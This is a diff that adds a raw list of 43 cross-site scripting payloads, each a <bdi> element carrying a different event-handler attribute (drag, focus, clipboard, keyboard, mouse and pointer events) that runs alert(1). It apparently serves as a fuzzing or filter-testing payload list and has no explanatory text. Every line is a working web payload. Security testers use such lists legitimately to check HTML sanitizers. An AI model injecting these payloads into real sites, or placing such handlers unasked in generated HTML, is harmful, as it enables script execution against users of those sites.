@@ -1,0 +1,43 @@
+<bdi draggable="true" ondrag="alert(1)">test</bdi>
+<bdi draggable="true" ondragend="alert(1)">test</bdi>
+<bdi draggable="true" ondragenter="alert(1)">test</bdi>
+<bdi draggable="true" ondragleave="alert(1)">test</bdi>
+<bdi draggable="true" ondragstart="alert(1)">test</bdi>
+<bdi id=x tabindex=1 onactivate=alert(1)></bdi>
+<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>
+<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>
+<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>
+<bdi id=x tabindex=1 onfocus=alert(1)></bdi>
+<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
+<bdi onafterscriptexecute=alert(1)><script>1</script>
+<bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
+<bdi onbeforecut="alert(1)" contenteditable>test</bdi>
+<bdi onbeforepaste="alert(1)" contenteditable>test</bdi>
+<bdi onbeforescriptexecute=alert(1)><script>1</script>
+<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>
+<bdi onclick="alert(1)">test</bdi>
+<bdi oncontextmenu="alert(1)">test</bdi>
+<bdi oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<bdi oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<bdi ondblclick="alert(1)" autofocus tabindex=1>test</bdi>
+<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>
+<bdi onkeydown="alert(1)" contenteditable>test</bdi>
+<bdi onkeypress="alert(1)" contenteditable>test</bdi>
+<bdi onkeyup="alert(1)" contenteditable>test</bdi>
+<bdi onmousedown="alert(1)">test</bdi>
+<bdi onmouseenter="alert(1)">test</bdi>
+<bdi onmouseleave="alert(1)">test</bdi>
+<bdi onmousemove="alert(1)">test</bdi>
+<bdi onmouseout="alert(1)">test</bdi>
+<bdi onmouseover="alert(1)">test</bdi>
+<bdi onmouseup="alert(1)">test</bdi>
+<bdi onmousewheel=alert(1)>requires scrolling
+<bdi onpaste="alert(1)" contenteditable>test</bdi>
+<bdi onpointerdown=alert(1)>XSS</bdi>
+<bdi onpointerenter=alert(1)>XSS</bdi>
+<bdi onpointerleave=alert(1)>XSS</bdi>
+<bdi onpointermove=alert(1)>XSS</bdi>
+<bdi onpointerout=alert(1)>XSS</bdi>
+<bdi onpointerover=alert(1)>XSS</bdi>
+<bdi onpointerrawupdate=alert(1)>XSS</bdi>
+<bdi onpointerup=alert(1)>XSS</bdi>
